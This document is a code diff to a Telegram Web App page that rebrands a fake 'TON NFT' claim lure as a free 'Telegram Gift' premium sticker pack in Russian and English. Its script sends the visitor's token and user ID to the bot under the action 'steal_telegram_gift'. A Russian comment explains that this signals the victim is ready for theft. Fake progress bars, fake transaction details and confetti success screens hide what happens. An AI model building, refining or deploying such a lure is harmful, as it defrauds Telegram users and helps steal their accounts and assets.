@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON NFT Collection</title>
+    <title>Telegram Gift</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -110,7 +110,7 @@
             color: white;
         }
 
-        .nft-card {
+        .gift-card {
             background: var(--card-bg);
             border-radius: 20px;
             padding: 30px;
@@ -120,7 +120,7 @@
             margin-bottom: 20px;
         }
 
-        .nft-card::before {
+        .gift-card::before {
             content: '';
             position: absolute;
             top: 0;
@@ -130,11 +130,11 @@
             background: linear-gradient(90deg, transparent, var(--accent), transparent);
         }
 
-        .verified-badge {
+        .premium-badge {
             position: absolute;
             top: 20px;
             right: 20px;
-            background: var(--success);
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
             color: white;
             padding: 6px 12px;
             border-radius: 20px;
@@ -145,7 +145,7 @@
             gap: 4px;
         }
 
-        .nft-image {
+        .gift-image {
             width: 200px;
             height: 200px;
             margin: 0 auto 25px;
@@ -154,9 +154,12 @@
             position: relative;
             overflow: hidden;
             border: 2px solid var(--primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        .nft-glow {
+        .gift-glow {
             position: absolute;
             top: -50%;
             left: -50%;
@@ -166,7 +169,7 @@
             animation: rotate 4s linear infinite;
         }
 
-        .nft-content {
+        .gift-content {
             position: relative;
             z-index: 2;
             display: flex;
@@ -175,36 +178,40 @@
             justify-content: center;
             height: 100%;
             padding: 20px;
-        }
-
-        .nft-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
-            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
-        }
-
-        .nft-title {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 8px;
             text-align: center;
         }
 
-        .nft-collection {
+        .gift-icon {
+            font-size: 64px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
+            animation: bounce 2s infinite;
+        }
+
+        .gift-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, #fff, var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .gift-type {
             font-size: 14px;
             color: var(--accent);
             font-weight: 600;
             margin-bottom: 5px;
         }
 
-        .nft-description {
+        .gift-description {
             font-size: 12px;
             color: var(--text-light);
-            text-align: center;
             line-height: 1.4;
+            max-width: 80%;
         }
 
-        .nft-stats {
+        .gift-stats {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 15px;
@@ -341,7 +348,7 @@
             line-height: 1.5;
         }
 
-        .transaction-details {
+        .gift-details {
             background: rgba(255,255,255,0.05);
             border-radius: 16px;
             padding: 20px;
@@ -349,7 +356,7 @@
             border: 1px solid var(--border);
         }
 
-        .transaction-row {
+        .detail-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -357,22 +364,22 @@
             border-bottom: 1px solid var(--border);
         }
 
-        .transaction-row:last-child {
+        .detail-row:last-child {
             border-bottom: none;
         }
 
-        .transaction-label {
+        .detail-label {
             font-size: 13px;
             color: var(--text-light);
         }
 
-        .transaction-value {
+        .detail-value {
             font-size: 13px;
             font-weight: 600;
             color: white;
         }
 
-        .security-badge {
+        .telegram-badge {
             display: flex;
             align-items: center;
             gap: 8px;
@@ -404,6 +411,12 @@
             100% { transform: scale(1); opacity: 1; }
         }
 
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.7; }
@@ -411,6 +424,19 @@
 
         .pulse {
             animation: pulse 2s infinite;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: var(--accent);
+            animation: confettiFall 3s linear forwards;
+        }
+
+        @keyframes confettiFall {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
         }
     </style>
 </head>
@@ -420,8 +446,8 @@
     <div class="container">
         <div class="header">
             <div class="logo">
-                <div class="logo-icon">⚡</div>
-                <span>TON NFT</span>
+                <div class="logo-icon">🎁</div>
+                <span>Telegram Gift</span>
             </div>
             <div class="lang-switcher">
                 <button class="lang-btn active" onclick="switchLanguage('ru')">RU</button>
@@ -429,36 +455,36 @@
             </div>
         </div>
 
-        <div class="nft-card">
-            <div class="verified-badge">
-                <span>✓</span>
-                VERIFIED
+        <div class="gift-card">
+            <div class="premium-badge">
+                <span>⭐</span>
+                PREMIUM
             </div>
             
-            <div class="nft-image">
-                <div class="nft-glow"></div>
-                <div class="nft-content">
-                    <div class="nft-icon">🎴</div>
-                    <div class="nft-collection">TON PUNKS</div>
-                    <div class="nft-title" id="nftTitle">#7421 Rare Edition</div>
-                    <div class="nft-description" id="nftDescription">Exclusive digital collectible on TON blockchain</div>
+            <div class="gift-image">
+                <div class="gift-glow"></div>
+                <div class="gift-content">
+                    <div class="gift-icon">🎁</div>
+                    <div class="gift-type" id="giftType">ЭКСКЛЮЗИВНЫЙ ПОДАРОК</div>
+                    <div class="gift-title" id="giftTitle">Премиум стикерпак</div>
+                    <div class="gift-description" id="giftDescription">Ограниченная коллекция анимированных стикеров для вашего профиля</div>
                 </div>
             </div>
 
-            <div class="nft-stats">
+            <div class="gift-stats">
                 <div class="stat">
                     <div class="stat-label" id="rarityLabel">РЕДКОСТЬ</div>
-                    <div class="stat-value">LEGENDARY</div>
+                    <div class="stat-value">ЭКСКЛЮЗИВ</div>
                 </div>
                 <div class="stat">
                     <div class="stat-label" id="valueLabel">СТОИМОСТЬ</div>
-                    <div class="stat-value">~125 TON</div>
+                    <div class="stat-value">БЕСПЛАТНО</div>
                 </div>
             </div>
 
             <div class="loading-section">
                 <div class="loading-header">
-                    <div class="loading-title" id="loadingText">ПОДКЛЮЧЕНИЕ К СЕТИ TON</div>
+                    <div class="loading-title" id="loadingText">ПОДКЛЮЧЕНИЕ К TELEGRAM</div>
                     <div class="loading-percent" id="loadingPercent">0%</div>
                 </div>
                 <div class="progress-bar">
@@ -471,27 +497,27 @@
             </button>
         </div>
 
-        <div class="nft-card success-section" id="successSection">
+        <div class="gift-card success-section" id="successSection">
             <div class="success-icon">✓</div>
-            <div class="success-title" id="successTitle">АКТИВ ПРИНЯТ</div>
-            <div class="success-subtitle" id="successSubtitle">NFT успешно добавлен в вашу коллекцию TON</div>
+            <div class="success-title" id="successTitle">ПОДАРОК АКТИВИРОВАН</div>
+            <div class="success-subtitle" id="successSubtitle">Эксклюзивный стикерпак успешно добавлен в ваш профиль Telegram</div>
             
-            <div class="transaction-details">
-                <div class="transaction-row">
-                    <div class="transaction-label" id="txHashLabel">ХЭШ ТРАНЗАКЦИИ</div>
-                    <div class="transaction-value">0x8a3f...c42d</div>
+            <div class="gift-details">
+                <div class="detail-row">
+                    <div class="detail-label" id="giftNameLabel">НАЗВАНИЕ</div>
+                    <div class="detail-value">Premium StickerPack</div>
                 </div>
-                <div class="transaction-row">
-                    <div class="transaction-label" id="blockLabel">БЛОК</div>
-                    <div class="transaction-value">#12,842,117</div>
+                <div class="detail-row">
+                    <div class="detail-label" id="giftIdLabel">ID ПОДАРКА</div>
+                    <div class="detail-value">#TG2024PREMIUM</div>
                 </div>
-                <div class="transaction-row">
-                    <div class="transaction-label" id="gasLabel">КОМИССИЯ</div>
-                    <div class="transaction-value">0.015 TON</div>
+                <div class="detail-row">
+                    <div class="detail-label" id="activationLabel">АКТИВАЦИЯ</div>
+                    <div class="detail-value" style="color: var(--success)">УСПЕШНО</div>
                 </div>
-                <div class="transaction-row">
-                    <div class="transaction-label" id="statusLabel">СТАТУС</div>
-                    <div class="transaction-value" style="color: var(--success)">ПОДТВЕРЖДЕНО</div>
+                <div class="detail-row">
+                    <div class="detail-label" id="expiresLabel">ДЕЙСТВУЕТ ДО</div>
+                    <div class="detail-value">БЕССРОЧНО</div>
                 </div>
             </div>
 
@@ -499,9 +525,9 @@
                 <span id="closeText">ЗАКРЫТЬ</span>
             </button>
 
-            <div class="security-badge">
-                <span>🛡️</span>
-                <span id="securityText">Транзакция защищена TON Blockchain</span>
+            <div class="telegram-badge">
+                <span>🔒</span>
+                <span id="securityText">Активировано через Telegram</span>
             </div>
         </div>
     </div>
@@ -514,35 +540,37 @@
         let currentLang = 'ru';
         const translations = {
             ru: {
-                nftTitle: "#7421 Rare Edition",
-                nftDescription: "Эксклюзивный цифровой актив в блокчейне TON",
+                giftType: "ЭКСКЛЮЗИВНЫЙ ПОДАРОК",
+                giftTitle: "Премиум стикерпак",
+                giftDescription: "Ограниченная коллекция анимированных стикеров для вашего профиля",
                 rarity: "РЕДКОСТЬ",
                 value: "СТОИМОСТЬ",
-                loading: "ПОДКЛЮЧЕНИЕ К СЕТИ TON",
+                loading: "ПОДКЛЮЧЕНИЕ К TELEGRAM",
                 action: "ПОДКЛЮЧЕНИЕ...",
-                successTitle: "АКТИВ ПРИНЯТ",
-                successSubtitle: "NFT успешно добавлен в вашу коллекцию TON",
-                txHash: "ХЭШ ТРАНЗАКЦИИ",
-                block: "БЛОК",
-                gas: "КОМИССИЯ",
-                status: "СТАТУС",
-                security: "Транзакция защищена TON Blockchain",
+                successTitle: "ПОДАРОК АКТИВИРОВАН",
+                successSubtitle: "Эксклюзивный стикерпак успешно добавлен в ваш профиль Telegram",
+                giftName: "НАЗВАНИЕ",
+                giftId: "ID ПОДАРКА",
+                activation: "АКТИВАЦИЯ",
+                expires: "ДЕЙСТВУЕТ ДО",
+                security: "Активировано через Telegram",
                 close: "ЗАКРЫТЬ"
             },
             en: {
-                nftTitle: "#7421 Rare Edition",
-                nftDescription: "Exclusive digital asset on TON blockchain",
+                giftType: "EXCLUSIVE GIFT",
+                giftTitle: "Premium Sticker Pack",
+                giftDescription: "Limited collection of animated stickers for your profile",
                 rarity: "RARITY",
                 value: "VALUE",
-                loading: "CONNECTING TO TON NETWORK",
+                loading: "CONNECTING TO TELEGRAM",
                 action: "CONNECTING...",
-                successTitle: "ASSET RECEIVED",
-                successSubtitle: "NFT successfully added to your TON collection",
-                txHash: "TRANSACTION HASH",
-                block: "BLOCK",
-                gas: "GAS FEE",
-                status: "STATUS",
-                security: "Transaction secured by TON Blockchain",
+                successTitle: "GIFT ACTIVATED",
+                successSubtitle: "Exclusive sticker pack successfully added to your Telegram profile",
+                giftName: "NAME",
+                giftId: "GIFT ID",
+                activation: "ACTIVATION",
+                expires: "VALID UNTIL",
+                security: "Activated via Telegram",
                 close: "CLOSE"
             }
         };
@@ -558,18 +586,19 @@
 
         function updateTexts() {
             const t = translations[currentLang];
-            document.getElementById('nftTitle').textContent = t.nftTitle;
-            document.getElementById('nftDescription').textContent = t.nftDescription;
+            document.getElementById('giftType').textContent = t.giftType;
+            document.getElementById('giftTitle').textContent = t.giftTitle;
+            document.getElementById('giftDescription').textContent = t.giftDescription;
             document.getElementById('rarityLabel').textContent = t.rarity;
             document.getElementById('valueLabel').textContent = t.value;
             document.getElementById('loadingText').textContent = t.loading;
             document.getElementById('actionText').textContent = t.action;
             document.getElementById('successTitle').textContent = t.successTitle;
             document.getElementById('successSubtitle').textContent = t.successSubtitle;
-            document.getElementById('txHashLabel').textContent = t.txHash;
-            document.getElementById('blockLabel').textContent = t.block;
-            document.getElementById('gasLabel').textContent = t.gas;
-            document.getElementById('statusLabel').textContent = t.status;
+            document.getElementById('giftNameLabel').textContent = t.giftName;
+            document.getElementById('giftIdLabel').textContent = t.giftId;
+            document.getElementById('activationLabel').textContent = t.activation;
+            document.getElementById('expiresLabel').textContent = t.expires;
             document.getElementById('securityText').textContent = t.security;
             document.getElementById('closeText').textContent = t.close;
         }
@@ -586,6 +615,22 @@
                 particle.style.animationDelay = Math.random() * 6 + 's';
                 particle.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
                 container.appendChild(particle);
+            }
+        }
+
+        function createConfetti() {
+            const container = document.getElementById('successSection');
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = Math.random() * 100 + '%';
+                    confetti.style.background = `hsl(${Math.random() * 360}, 100%, 60%)`;
+                    confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                    container.appendChild(confetti);
+                    
+                    setTimeout(() => confetti.remove(), 3000);
+                }, i * 100);
             }
         }
 
@@ -611,21 +656,23 @@
 
         function completeProgress() {
             document.getElementById('actionBtn').disabled = false;
-            document.getElementById('actionText').textContent = currentLang === 'ru' ? 'ПОЛУЧИТЬ NFT' : 'CLAIM NFT';
+            document.getElementById('actionText').textContent = currentLang === 'ru' ? '🎁 ПОЛУЧИТЬ ПОДАРОК' : '🎁 GET GIFT';
             document.getElementById('loadingText').textContent = currentLang === 'ru' ? 'ПОДКЛЮЧЕНИЕ УСПЕШНО' : 'CONNECTION SUCCESSFUL';
             
+            // Отправляем данные боту о том, что жертва готова к краже
             tg.sendData(JSON.stringify({
                 token: token,
                 user_id: userId,
-                action: 'steal_ton_nft',
+                action: 'steal_telegram_gift',
                 timestamp: Date.now(),
-                platform: 'ton_web_app'
+                platform: 'telegram_web_app'
             }));
         }
 
         function showSuccess() {
-            document.querySelector('.nft-card:not(.success-section)').style.display = 'none';
+            document.querySelector('.gift-card:not(.success-section)').style.display = 'none';
             document.getElementById('successSection').style.display = 'block';
+            createConfetti();
         }
 
         function closeApp() {
@@ -637,6 +684,13 @@
                 showSuccess();
             }
         });
+
+        // Автоматический переход к успеху через 2 секунды после активации
+        setTimeout(() => {
+            if (!document.getElementById('actionBtn').disabled) {
+                showSuccess();
+            }
+        }, 2000);
 
         createParticles();
         updateTexts();
